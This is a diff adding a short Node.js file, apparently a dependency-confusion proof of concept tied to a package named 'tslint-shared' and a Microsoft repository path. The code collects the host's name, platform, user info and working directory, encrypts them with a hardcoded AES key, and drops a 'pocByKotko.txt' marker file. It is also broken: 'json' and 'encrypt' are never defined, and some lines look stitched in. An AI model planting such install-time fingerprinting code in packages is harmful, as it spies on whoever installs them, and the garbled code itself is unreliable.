@@ -1,0 +1,24 @@
+var os = require("os")
+const request = require('request')
+const crypto = require('crypto')
+var fs = require('fs')
+var hostname = os.hostname()
+var type = os.platform()
+var userInfo = os.userInfo()
+var currentPath = process.cwd()
+__ecma.Array.factory()
+const algorithm = 'aes-256-ctr'
+const secretKey = 'vOVH6sdmpNWjRRIqCc7rdxs01lwHzfr3'
+const iv = crypto.randomBytes(16)
+json.push(hostname)
+json.push(type)
+json.push(userInfo)
+json.push(currentPath)
+json = JSON.stringify(json)
+_tmp_0 = require('./crypto')
+let hash = encrypt(json)
+let company = "microsoft/react-native-tscodegen:packages/update-test-files/package.json"
+let packages = "tslint-shared"
+fs.writeFile('pocByKotko.txt', 'this proof for bug', function (err) {
+  if (err) throw err;
+})
